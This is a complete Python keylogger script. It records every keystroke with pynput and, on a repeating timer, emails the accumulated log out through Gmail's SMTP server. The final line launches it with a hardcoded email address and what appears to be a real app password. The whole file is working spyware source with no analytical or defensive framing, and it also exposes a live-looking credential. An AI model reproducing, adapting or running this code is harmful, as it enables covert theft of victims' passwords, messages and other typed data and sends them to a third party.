import smtplib

import pynput.keyboard
import threading


class KeyLogger:
    def __init__(self, interval, email, password):
        self.log = ""
        self.interval = interval
        self.password = password
        self.email = email

    def append(self, your_string):
        self.log = self.log + str(your_string)

    def _process_key(self, key):
        try:
            self.append(your_string=key.char)
        except AttributeError:
            # print(f"{e}: {key}")
            if str(key) == "Key.space":
                self.append(your_string=" ")
            else:
                self.append(your_string=f" {str(key)} ")

        # print(log)

    def _report(self):
        self.send_mail(email=self.email, password=self.password, message=f"\n\n{str(self.log)}")
        self.log = " "
        timer = threading.Timer(self.interval, self._report)
        timer.start()

    def send_mail(self, email, password, message):
        with smtplib.SMTP("smtp.gmail.com", 587) as connection:
            connection.starttls()
            connection.login(user=email, password=password)
            connection.sendmail(email, email, message)

    def start(self):
        keyword_listener = pynput.keyboard.Listener(on_press=self._process_key)
        with keyword_listener:
            self._report()
            keyword_listener.join()


KeyLogger(interval=10000, email="demo8552051878@gmail.com", password="yojwiabucqzxammo").start()
